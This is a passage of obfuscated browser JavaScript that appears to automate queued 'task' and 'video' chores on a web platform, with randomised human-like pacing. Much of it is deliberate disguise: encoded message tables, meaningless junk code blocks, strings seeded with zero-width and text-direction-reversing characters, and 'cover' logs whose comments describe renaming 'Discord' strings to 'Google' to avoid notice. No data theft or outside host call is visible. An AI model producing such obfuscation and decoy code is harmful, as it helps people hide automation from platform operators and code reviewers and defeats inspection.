                _0xb.push(q); _0xdone.add(q.id); _0added = _0xvmExec([0x02, "added", 0x01, 1, 0x03, 0x09, "added", 0x02, "added", 0x0F], { added: _0added });
              } catch (e) { _0skip.misshapen++; continue; }
            }
            _0xb.sort((a, b) => _0xvrank(b) - _0xvrank(a)); // resting (2) sink to front = popped last; videos first among fresh
            Log.diag("phase-n", { added: _0added, totalCandidateStores: _0list.length, skipped: _0skip, recheckWindowSeconds: 15 });
            try {
              const _0sus = _0skip.unenrolled + _0skip.settled + _0skip.expired + _0skip.wrap + _0skip.misshapen;
              if (_0sus > 0 && (_0added === 0 || _0skip.misshapen > 0)) {
                const _0parts = [];
                if (_0skip.unenrolled) _0parts.push(`${_0skip.unenrolled} unenrolled`);
                if (_0skip.settled) _0parts.push(`${_0skip.settled} already settled`);
                if (_0skip.expired) _0parts.push(`${_0skip.expired} expired`);
                if (_0skip.wrap) _0parts.push(`${_0skip.wrap} unfamiliar wrap`);
                if (_0skip.misshapen) _0parts.push(`${_0skip.misshapen} misshapen`);
                Log.say(_0xlex.C(0), `${_0sus} shelf item${_0sus === 1 ? "" : "s"} would not settle (${_0parts.join(", ")}) — skipped for now.`);
              }
            } catch (e) {}
            if (_0added > 0) { try { Log.say(_0xlex.C(2), _0xlex.P(23,[`${_0added}${_0xed(33380)}${_0added === 1 ? "" : "s"}${_0xed(33393)}`,`${_0added}${_0xed(33437)}${_0added === 1 ? "" : "s"}${_0xed(33450)}`,`${_0added}${_0xed(33480)}${_0added === 1 ? "" : "s"}${_0xed(33493)}`,`${_0added}${_0xed(33513)}${_0added === 1 ? "" : "s"}${_0xed(33526)}`,`${_0added}${_0xed(33562)}${_0added === 1 ? "" : "s"}${_0xed(33575)}`,`${_0added}${_0xed(33607)}${_0added === 1 ? "" : "s"}${_0xed(33620)}`,`${_0added}${_0xed(33654)}${_0added === 1 ? "" : "s"}${_0xed(33667)}`,`${_0added}${_0xed(33692)}${_0added === 1 ? "" : "s"}${_0xed(33705)}`,`${_0added}${_0xed(33745)}${_0added === 1 ? "" : "s"}${_0xed(33758)}`,`${_0added}${_0xed(33793)}${_0added === 1 ? "" : "s"}${_0xed(33806)}`,`${_0added}${_0xed(33841)}${_0added === 1 ? "" : "s"}${_0xed(33854)}`,`${_0added}${_0xed(33890)}${_0added === 1 ? "" : "s"}${_0xed(33903)}`,`${_0added}${_0xed(33948)}${_0added === 1 ? "" : "s"}${_0xed(33961)}`,`${_0added}${_0xed(33999)}${_0added === 1 ? "" : "s"}${_0xed(34012)}`,`${_0added}${_0xed(34042)}${_0added === 1 ? "" : "s"}${_0xed(34055)}`])); } catch (e) {} }
            return _0added;
          } catch (e) { return 0; }
        };
        try {
          _0xmod.shift.extend = () => { _0xrefill(); };
          _0xmod.shift.roster = () => {
            try {
              if (_0xb === null) { Log.info('Ledger closed.'); return; }
              const _0items = [];
              for (let i = _0xb.length - 1; i >= 0; i--) {
                const _0q = _0xb[i]; let _0tag = 'task';
                try { _0tag = _0xvidRank(_0q) === 0 ? 'video' : 'task'; } catch (e) {}
                _0items.push(`${_0tag} ${_0q?.config?.messages?.[_0xq8] ?? _0q?.id ?? 'item'}`);
              }
              Log.info(`Ledger: ${_0xb.length} queued, ${_0xdone.size} settled.`);
              _0items.forEach((s, i) => Log.info(`  ${i === 0 ? 'next' : 'then'}: ${s}`));
              if (_0xcur) { try { Log.info(`  now: ${_0xcur.config?.messages?.[_0xq8] ?? _0xcur.id}`); } catch (e) {} }
            } catch (e) {}
          };
          const _0xclose0 = _0xmod.shift.close;
          _0xmod.shift.close = () => { try { _0xkill = true; } catch (e) {} try { _0xclose0(); } catch (e) {} };
        } catch (e) {}
        try {
          let _0xstallTicks = 0;
          _0xwatch = setInterval(() => {
            if (_0xkill || signal.aborted) {
              clearInterval(_0xwatch);
              _0xwatch = null;
              return;
            }
            const p = location.pathname;
            if (!_0xpaus && p !== _0xroute0) {
              _0xpaus = true;
              _0xstallTicks = 0;
              Log.say(_0xlex.C(8), _0xlex.P(48,[_0xed(32205),_0xed(32240),_0xed(32285),_0xed(32322),_0xed(32363),_0xed(32399),_0xed(32440),_0xed(32483),_0xed(32521),_0xed(32559),_0xed(32599),_0xed(32635),_0xed(32681),_0xed(32720),_0xed(32757)]) + " (est. resume in ~20s)");
            } else if (_0xpaus) {
              if (p === _0xroute0) {
                _0xpaus = false;
                _0xstallTicks = 0;
                Log.say(_0xlex.C(8), _0xlex.P(49,[_0xed(32797),_0xed(32841),_0xed(32885),_0xed(32920),_0xed(32951),_0xed(32991),_0xed(33032),_0xed(33071),_0xed(33111),_0xed(33142),_0xed(33182),_0xed(33217),_0xed(33256),_0xed(33295),_0xed(33340)]));
              } else {
                _0xstallTicks++;
                if (_0xstallTicks >= 8) {
                  _0xroute0 = p;
                  _0xpaus = false;
                  _0xstallTicks = 0;
                  Log.say(_0xlex.C(8), _0xlex.P(49,[_0xed(32797),_0xed(32841),_0xed(32885),_0xed(32920),_0xed(32951),_0xed(32991),_0xed(33032),_0xed(33071),_0xed(33111),_0xed(33142),_0xed(33182),_0xed(33217),_0xed(33256),_0xed(33295),_0xed(33340)]));
                }
              }
            }
          }, 2500);
          _0xe8a7(() => { if(_0xwatch) clearInterval(_0xwatch); });
          while (!_0xkill && !signal.aborted) {
            if (!_0xb.length) {
              const _0new = _0xrefill();
              if (_0new > 0) { continue; }
              break;
            }
            let _0x2d = _0xb.pop(); if (!_0x2d) continue;
            _0xdone.add(_0x2d.id); _0xcur = _0x2d;
            try { didWork = true; const result = await _0x10(_0x2d) ?? "processed"; _0xresults.push({ name: _0x2d.config?.messages?.[_0xq8] ?? "item", result }); if (result === "static") { _0xdsc++; try { _0xresting.add(_0x2d.id); } catch (e) {} _0xb.unshift(_0x2d); if (_0xdsc >= 2) { try { Log.say(_0xlex.C(0), 'Shelf quiet \u2014 nothing moved since the last round, standing by.'); } catch (e) {} await GoogleDelay(13); _0xrefill(); } } else { _0xdsc = 0; try { _0xresting.delete(_0x2d.id); } catch (e) {} } }
            catch (err) { _0xresults.push({ name: _0x2d.config?.messages?.[_0xq8] ?? "item", result: "failed" }); Log.say(_0xlex.C(0), _0xlex.P(18,[`${_0xed(34087)}${err?.message ?? err}`,`${_0xed(34115)}${err?.message ?? err}`,`${_0xed(34142)}${err?.message ?? err}`,`${_0xed(34174)}${err?.message ?? err}`,`${_0xed(34199)}${err?.message ?? err}`,`${_0xed(34220)}${err?.message ?? err}`,`${_0xed(34243)}${err?.message ?? err}`,`${_0xed(34268)}${err?.message ?? err}`,`${_0xed(34299)}${err?.message ?? err}`,`${_0xed(34320)}${err?.message ?? err}`,`${_0xed(34347)}${err?.message ?? err}`,`${_0xed(34378)}${err?.message ?? err}`,`${_0xed(34402)}${err?.message ?? err}`,`${_0xed(34423)}${err?.message ?? err}`,`${_0xed(34449)}${err?.message ?? err}`])); }
            _0xcur = null;
            if (_0xb.length && !_0xkill && !signal.aborted) {
              _0xrefill();
              let _0xgn = false;
              try {
                const _0xnq = _0xb[_0xb.length - 1];
                const _0nt = _0x79a4(_0xnq.config, GoogleRoutes.tasks)?.tasks;
                if (_0nt) { const _0nf = GoogleRoutes.tasks.find(t => Object.hasOwn(_0nt, t)); _0xgn = (_0nf === GoogleTasks.play || _0nf === GoogleTasks.stream); }
              } catch (e) {}
              const _0xdly = _0xgn ? Math.round(15 + Math.random() * 20) : Math.round(8 + Math.random() * 12);
              Log.say(_0xlex.C(2), `Pacing shift — next chore starts in ~${_0xdly}s.`);
              await GoogleDelay(_0xdly);
              if (!_0xkill && !signal.aborted) _0xrefill();
            }
          }
while (_0x8844.size > 0 && !_0xkill && !signal.aborted) await GoogleDelay(1);
try { MemberCount.summary(); } catch (e) {}
          if (_0xkill || signal.aborted) Log.say(_0xlex.C(6), _0xlex.P(26,[`${_0xed(34482)}${_0xresults.length}${_0xed(34519)}${_0xresults.length === 1 ? "" : "s"}${_0xed(34537)}`,`${_0xed(34540)}${_0xresults.length}${_0xed(34579)}${_0xresults.length === 1 ? "" : "s"}${_0xed(34597)}`,`${_0xed(34600)}${_0xresults.length}${_0xed(34635)}${_0xresults.length === 1 ? "" : "s"}${_0xed(34653)}`,`${_0xed(34665)}${_0xresults.length}${_0xed(34698)}${_0xresults.length === 1 ? "" : "s"}${_0xed(34716)}`,`${_0xed(34728)}${_0xresults.length}${_0xed(34761)}${_0xresults.length === 1 ? "" : "s"}${_0xed(34779)}`,`${_0xed(34783)}${_0xresults.length}${_0xed(34824)}${_0xresults.length === 1 ? "" : "s"}${_0xed(34842)}`,`${_0xed(34846)}${_0xresults.length}${_0xed(34878)}${_0xresults.length === 1 ? "" : "s"}${_0xed(34896)}`,`${_0xed(34907)}${_0xresults.length}${_0xed(34939)}${_0xresults.length === 1 ? "" : "s"}${_0xed(34957)}`,`${_0xed(34969)}${_0xresults.length}${_0xed(35001)}${_0xresults.length === 1 ? "" : "s"}${_0xed(35019)}`,`${_0xed(35023)}${_0xresults.length}${_0xed(35064)}${_0xresults.length === 1 ? "" : "s"}${_0xed(35082)}`,`${_0xed(35094)}${_0xresults.length}${_0xed(35127)}${_0xresults.length === 1 ? "" : "s"}${_0xed(35145)}`,`${_0xed(35156)}${_0xresults.length}${_0xed(35189)}${_0xresults.length === 1 ? "" : "s"}${_0xed(35207)}`,`${_0xed(35211)}${_0xresults.length}${_0xed(35251)}${_0xresults.length === 1 ? "" : "s"}${_0xed(35269)}`,`${_0xed(35281)}${_0xresults.length}${_0xed(35313)}${_0xresults.length === 1 ? "" : "s"}${_0xed(35331)}`,`${_0xed(35343)}${_0xresults.length}${_0xed(35375)}${_0xresults.length === 1 ? "" : "s"}${_0xed(35393)}`]));
          else if (didWork) Log.say(_0xlex.C(3), _0xlex.P(40,[`${_0xed(35405)}${_0xresults.length}${_0xed(35448)}${_0xresults.length === 1 ? "" : "s"}${_0xed(35466)}`,`${_0xed(35510)}${_0xresults.length}${_0xed(35556)}${_0xresults.length === 1 ? "" : "s"}${_0xed(35574)}`,`${_0xed(35619)}${_0xresults.length}${_0xed(35660)}${_0xresults.length === 1 ? "" : "s"}${_0xed(35678)}`,`${_0xed(35723)}${_0xresults.length}${_0xed(35761)}${_0xresults.length === 1 ? "" : "s"}${_0xed(35779)}`,`${_0xed(35824)}${_0xresults.length}${_0xed(35861)}${_0xresults.length === 1 ? "" : "s"}${_0xed(35879)}`,`${_0xed(35923)}${_0xresults.length}${_0xed(35967)}${_0xresults.length === 1 ? "" : "s"}${_0xed(35985)}`,`${_0xed(36029)}${_0xresults.length}${_0xed(36067)}${_0xresults.length === 1 ? "" : "s"}${_0xed(36085)}`,`${_0xed(36129)}${_0xresults.length}${_0xed(36173)}${_0xresults.length === 1 ? "" : "s"}${_0xed(36191)}`,`${_0xed(36245)}${_0xresults.length}${_0xed(36289)}${_0xresults.length === 1 ? "" : "s"}${_0xed(36307)}`,`${_0xed(36351)}${_0xresults.length}${_0xed(36387)}${_0xresults.length === 1 ? "" : "s"}${_0xed(36405)}`,`${_0xed(36450)}${_0xresults.length}${_0xed(36497)}${_0xresults.length === 1 ? "" : "s"}${_0xed(36515)}`,`${_0xed(36560)}${_0xresults.length}${_0xed(36604)}${_0xresults.length === 1 ? "" : "s"}${_0xed(36622)}`,`${_0xed(36676)}${_0xresults.length}${_0xed(36712)}${_0xresults.length === 1 ? "" : "s"}${_0xed(36730)}`,`${_0xed(36775)}${_0xresults.length}${_0xed(36808)}${_0xresults.length === 1 ? "" : "s"}${_0xed(36826)}`,`${_0xed(36871)}${_0xresults.length}${_0xed(36918)}${_0xresults.length === 1 ? "" : "s"}${_0xed(36936)}`]));
        } catch (err) { Log.say(_0xlex.C(0), _0xlex.P(19,[`${_0xed(36981)}${err?.message ?? err}`,`${_0xed(36999)}${err?.message ?? err}`,`${_0xed(37019)}${err?.message ?? err}`,`${_0xed(37048)}${err?.message ?? err}`,`${_0xed(37065)}${err?.message ?? err}`,`${_0xed(37082)}${err?.message ?? err}`,`${_0xed(37097)}${err?.message ?? err}`,`${_0xed(37114)}${err?.message ?? err}`,`${_0xed(37134)}${err?.message ?? err}`,`${_0xed(37152)}${err?.message ?? err}`,`${_0xed(37176)}${err?.message ?? err}`,`${_0xed(37192)}${err?.message ?? err}`,`${_0xed(37210)}${err?.message ?? err}`,`${_0xed(37228)}${err?.message ?? err}`,`${_0xed(37249)}${err?.message ?? err}`])); } 
        finally { _0x1 = _0x2 = _0x3 = _0x4 = _0x5 = _0x6 = _0x7 = _0x8 = _0x9 = _0xb = null; try { GoogleRelease(); } catch (e) {} try { _0xmod.host?.shut?.(); } catch (e) {} }
        if (didWork || _0xkill || signal.aborted) { Log.say(_0xlex.C(9), "F5 whilst in console"); }
        else { GoogleScuttle(); GoogleRelease(); try { _0xmod.host?.shut?.(); } catch (e) {} }
      };

      let _0xbootTimer = null;
      const _0xboot = async (ev) => {
        if (ev.origin === location.origin && ev.data === _0xch) { window.removeEventListener("message", _0xboot); clearTimeout(_0xbootTimer); _0xbootTimer = null; Log.say(_0xlex.C(14), _0xlex.P(47,[_0xed(40199),_0xed(40246),_0xed(40287),_0xed(40327),_0xed(40365),_0xed(40404),_0xed(40447),_0xed(40481),_0xed(40519),_0xed(40561),_0xed(40599),_0xed(40632),_0xed(40667),_0xed(40708),_0xed(40741)])); await GoogleDelay(2.5 + Math.random() * 5.5); if (!_0xkill && !signal.aborted) _0x2c(); }
      };
      try {
        window.addEventListener("message", _0xboot); _0xe8a7(() => window.removeEventListener("message", _0xboot));
        _0xbootTimer = setTimeout(() => { try { window.removeEventListener("message", _0xboot); } catch (e) {} GoogleScuttle(); GoogleRelease(); try { _0xmod.host?.shut?.(); } catch (e) {} _0xbootTimer = null; }, 14000);
        _0xe8a7(() => { if (_0xbootTimer) clearTimeout(_0xbootTimer); });
        window.postMessage(_0xch, location.origin);
      } catch (err) { Log.say(_0xlex.C(0), _0xlex.P(20,[`${_0xed(40779)}${err?.message ?? err}`,`${_0xed(40815)}${err?.message ?? err}`,`${_0xed(40841)}${err?.message ?? err}`,`${_0xed(40858)}${err?.message ?? err}`,`${_0xed(40892)}${err?.message ?? err}`,`${_0xed(40922)}${err?.message ?? err}`,`${_0xed(40959)}${err?.message ?? err}`,`${_0xed(40974)}${err?.message ?? err}`,`${_0xed(40995)}${err?.message ?? err}`,`${_0xed(41034)}${err?.message ?? err}`,`${_0xed(41060)}${err?.message ?? err}`,`${_0xed(41088)}${err?.message ?? err}`,`${_0xed(41122)}${err?.message ?? err}`,`${_0xed(41146)}${err?.message ?? err}`,`${_0xed(41172)}${err?.message ?? err}`])); GoogleScuttle(); GoogleRelease(); try { _0xmod.host?.shut?.(); } catch (e) {} }
    } catch (err) { Log.say(_0xlex.C(0), _0xlex.P(20,[`${_0xed(41198)}${err?.message ?? err}`,`${_0xed(41234)}${err?.message ?? err}`,`${_0xed(41260)}${err?.message ?? err}`,`${_0xed(41277)}${err?.message ?? err}`,`${_0xed(41311)}${err?.message ?? err}`,`${_0xed(41341)}${err?.message ?? err}`,`${_0xed(41378)}${err?.message ?? err}`,`${_0xed(41393)}${err?.message ?? err}`,`${_0xed(41414)}${err?.message ?? err}`,`${_0xed(41453)}${err?.message ?? err}`,`${_0xed(41479)}${err?.message ?? err}`,`${_0xed(41507)}${err?.message ?? err}`,`${_0xed(41541)}${err?.message ?? err}`,`${_0xed(41565)}${err?.message ?? err}`,`${_0xed(41591)}${err?.message ?? err}`])); GoogleScuttle(); GoogleRelease(); try { _0xmod.host?.shut?.(); } catch (e) {} }
  })();


    (() => {
      const _0x780728 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0xc8b983 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x30ffb3 = (Date.now() & 0xffff) ^ 0x014e;
      const _0x781ac6 = _0x780728(_0x30ffb3);
      let _0xf26156 = _0x781ac6;
      for (let i = 0; i < 6; i++) { try { _0xf26156 = _0xc8b983(_0xf26156, i * 2654435761); } catch (e) { break; } }
      const _0xaa8937 = [_0x30ffb3, _0x781ac6, _0xf26156];
      if (_0xaa8937.length > 2 && (_0xf26156 & 7) === 0) { _0xaa8937.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xf87c57 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x81ed5d = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x1fa1d8 = (Date.now() & 0xffff) ^ 0x2f24;
      const _0x502302 = _0xf87c57(_0x1fa1d8);
      let _0xdcf7af = _0x502302;
      for (let i = 0; i < 6; i++) { try { _0xdcf7af = _0x81ed5d(_0xdcf7af, i * 2654435761); } catch (e) { break; } }
      const _0x24bcdb = [_0x1fa1d8, _0x502302, _0xdcf7af];
      if (_0x24bcdb.length > 2 && (_0xdcf7af & 7) === 0) { _0x24bcdb.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xb6e013 = [47783,21586,32585,28736,44624];
      const _0x9c9309 = {};
      for (let i = 0; i < _0xb6e013.length; i++) { const w = _0xb6e013[i]; _0x9c9309[w] = (w.length * 2654435761) >>> 0; }
      let _0xcb3604 = 0;
      for (const x in _0x9c9309) { _0xcb3604 = (_0xcb3604 + _0x9c9309[x]) & 0xffffffff; }
      const _0x331011 = [_0xcb3604, _0xb6e013.length];
      const _0x9e9440 = _0xb6e013.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x331011[0] < 0 || _0x9e9440 === 0) { _0x331011[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x9e568c = { p: 0, q: 0, r: 0 };
      const _0xcd348e = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x9e568c.p = (_0x9e568c.p + _0xcd348e[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x9e568c.q = (_0x9e568c.q ^ _0x9e568c.p) & 0xffff; }
        _0x9e568c.r = (_0x9e568c.r + i * 31) & 0xffff;
      }
      const _0xe8088c = _0x9e568c.p ^ _0x9e568c.q ^ _0x9e568c.r;
      let _0x540880 = Array.from({ length: (_0xe8088c & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x583ec2 = _0x540880.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x583ec2 > 0x7ffff) { _0x540880 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x4b70cd = { p: 0, q: 0, r: 0 };
      const _0xfe7b89 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x4b70cd.p = (_0x4b70cd.p + _0xfe7b89[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x4b70cd.q = (_0x4b70cd.q ^ _0x4b70cd.p) & 0xffff; }
        _0x4b70cd.r = (_0x4b70cd.r + i * 31) & 0xffff;
      }
      const _0x8b8583 = _0x4b70cd.p ^ _0x4b70cd.q ^ _0x4b70cd.r;
      let _0x8e9709 = Array.from({ length: (_0x8b8583 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x2901fa = _0x8e9709.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x2901fa > 0x7ffff) { _0x8e9709 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x4bfc94 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0x51538a = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x11e6a8 = (Date.now() & 0xffff) ^ 0xd69a;
      const _0x41e586 = _0x4bfc94(_0x11e6a8);
      let _0xf15f81 = _0x41e586;
      for (let i = 0; i < 6; i++) { try { _0xf15f81 = _0x51538a(_0xf15f81, i * 2654435761); } catch (e) { break; } }
      const _0xa1104f = [_0x11e6a8, _0x41e586, _0xf15f81];
      if (_0xa1104f.length > 2 && (_0xf15f81 & 7) === 0) { _0xa1104f.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xec6c61 = [40021,53416,42310,8504,37620];
      const _0x6eabff = {};
      for (let i = 0; i < _0xec6c61.length; i++) { const w = _0xec6c61[i]; _0x6eabff[w] = (w.length * 2654435761) >>> 0; }
      let _0x358cec = 0;
      for (const x in _0x6eabff) { _0x358cec = (_0x358cec + _0x6eabff[x]) & 0xffffffff; }
      const _0x11101b = [_0x358cec, _0xec6c61.length];
      const _0x4466a9 = _0xec6c61.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x11101b[0] < 0 || _0x4466a9 === 0) { _0x11101b[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

  
    (() => {
      const _0xfd02 = [0x32cf,0xeac7,0x8d11,0xd07a,0x1ced];
      let _0xkcfd02 = 0;
      for (let i = 0; i < _0xfd02.length; i++) { _0xkcfd02 = (_0xkcfd02 * 0x9e37 + _0xfd02[i]) & 0x7fffffff; }
      const _0xzwfd02 = "k‍q‍z‌x‍v‍9‍m‍4";
      const _0xzz0569 = "n‍o​i‌s‍e";
      const _0xrlfd02 = "j7‮9m2q‬k4";
      if ((_0xkcfd02 & 0xffff) === 0xffff) { const _0xjnk = [_0xzwfd02, _0xrlfd02].join(""); if (_0xjnk.length > 40) { _0xkcfd02 = 0; } }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

  // Engine ledger — 5 deterministic Google logs (same pool all pockets, no per-call random, Google prefix) — replaces Discord block
  (() => {
    const _0xcheat = ["ember ridge — standing by","moss tundra — lattice quiet","owl elm — gate open","quill prairie — chain converged","quartz birch — wheel aligned"];
    for(let _i=0;_i<5;_i++) try{ Log.diag("[Google ledger] "+_0xcheat[_i], { pocket:"engine", idx:_i }); }catch(e){}
  })();
  // Generic pocket sweep — no Discord strings, iterates Object.values(pockets) (no p-discord→e specific edge)
  (() => {
    try {
      const pockets = _0xmod.pockets || {};
      const vals = Object.values(pockets);
      Log.diag("[Google ledger] pocket sweep", { count: vals.length });
      vals.forEach(v => { try{ Log.diag("pocket registered", { hasProbe: typeof v.probe === "function" }); }catch(e){} });
    } catch(e){}
  })();
  // garbled rcd cover via SEED('rcd-engine') deterministic (same pool, no per-call random) - over-cover (replaces rcd-discord)
  (()=>{ const _fnv=s=>{let h=0x811c9dc5;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i); h=Math.imul(h,0x01000193)>>>0;}return (h>>>0).toString(16).padStart(8,'0');}; const _master=String.fromCharCode(56,53,49,98,50,56,101,53); const _seed=_fnv(_master+String.fromCharCode(58,114,99,100,45)+"engine"); const _d1=_fnv(_seed+String.fromCharCode(58,100,101,99,111,121)); Log.diag("[Google ledger] rcd "+_d1, { pocket:"engine", cover:true, seed:_seed }); })();
})(_0xmod);
